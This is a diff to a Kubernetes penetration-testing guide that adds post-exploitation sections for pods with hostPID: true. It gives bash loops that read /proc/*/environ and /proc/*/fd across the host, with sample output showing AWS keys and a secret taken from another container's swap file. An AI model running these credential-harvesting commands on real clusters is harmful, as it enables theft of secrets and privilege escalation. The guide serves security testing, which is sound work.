@@ -3,6 +3,8 @@
 
 There’s no clear path to get root on the node with only `hostPID`, but there are still some good post exploitation opportunities.  
 *	**View processes on the host** – When you run ps from within a pod that has hostPID: true, you see all the processes running on the host, including processes running within each pod. 
+*	**View the environment variables for each pod on the host** - With hostPID: true, you can read the /proc/[PID]/environ file for each process running on the host, including all processes running in pods. 
+*	**View the file descriptors for each pod on the host** - With hostPID: true, you can read the /proc/[PID]/fd[X] for each process running on the host, including all of the processes running in pods. Some of these allow you to read files that are opened within pods. 
 *	**Look for passwords, tokens, keys, etc.** – If you are lucky, you will find credentials and you’ll be able to use them to escalate privileges within the cluster, to escalate privileges services supported by the cluster, or to escalate privileges services that cluster-hosted applications are communicating with. It is a long shot, but you might find a Kubernetes service account token or some other authentication material that will allow you to access other namespaces and eventually escalate all the way up to cluster admin. 
 *	**Kill processes** – You can also kill any process on the node (presenting a denial-of-service risk), but I would advise against it on a penetration test!
 
@@ -15,6 +17,8 @@ There’s no clear path to get root on the node with only `hostPID`, but there a
   - [Deleting resources](#deleting-resources)
 - [Post exploitation](#post-exploitation)
   - [View all processes running on the host and look for passwords, tokens, keys, etc.](#view-all-processes-running-on-the-host-and-look-for-passwords-tokens-keys-etc)
+  - [View the environment variables for each pod on the host](#view-the-environment-variables-for-each-pod-on-the-host)
+  - [View the file descriptors for each pod on the host](#view-the-file-descriptors-for-each-pod-on-the-host)
   - [Also, you can also kill any process, but don't do that in production :)](#also-you-can-also-kill-any-process-but-dont-do-that-in-production-)
   - [Attacks that apply to all pods, even without any special permissions](#attacks-that-apply-to-all-pods-even-without-any-special-permissions)
 - [Demonstrate impact](#demonstrate-impact)
@@ -94,6 +98,55 @@ root     2123072  0.0  0.0   3732  2868 ?        Ss   21:00   0:00 /bin/bash -c 
 ...omitted for brevity...
 ```
 Check out that clear text password in the ps output below! 
+
+## View the environment variables for each pod on the host
+This lists the environ file for each process, and then uses xargs to split it up so that each environment variable is on it's own line:
+```bash
+for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done > envs.txt
+```
+Now it's time to look for interesting environment variables. 
+```bash
+root@hostpid-exec-pod:/# less procs.txt
+...omitted for brevity...
+
+/proc/578808/environ
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+HOSTNAME=envar-demo
+NPM_CONFIG_LOGLEVEL=info
+NODE_VERSION=4.4.2
+DEMO_FAREWELL=Such a sweet sorrow
+DEMO_GREETING=Hello from the environment
+AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+...omitted for brevity...
+```
+Oh look, an AWS IAM user key and secret! 
+
+## View the file descriptors for each pod on the host
+This lists out the file descriptors for each PID that we have access to.
+
+```bash
+for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
+```
+
+Now it's time to look for interesting files. Oh look, an vim swp file!
+```bash
+less fds.txt
+...omitted for brevity...
+lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
+lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
+lrwx------ 1 root root 64 Jun 15 02:26 /proc/635975/fd/0 -> /dev/null
+l-wx------ 1 root root 64 Jun 15 02:26 /proc/635975/fd/1 -> pipe:[65069205]
+```
+
+Let's see what's in `/.secret.txt.swp`. This file exists within a container, but we can access it by reading `/proc/635813/fd/4`!
+
+```bash
+cat /proc/635813/fd/4
+3210#"! UtadBnnmAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLEAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEYI'm going to keep my secrets in this file!
+```
+More secrets!
+
 
 ## Also, you can also kill any process, but don't do that in production :)
 ```
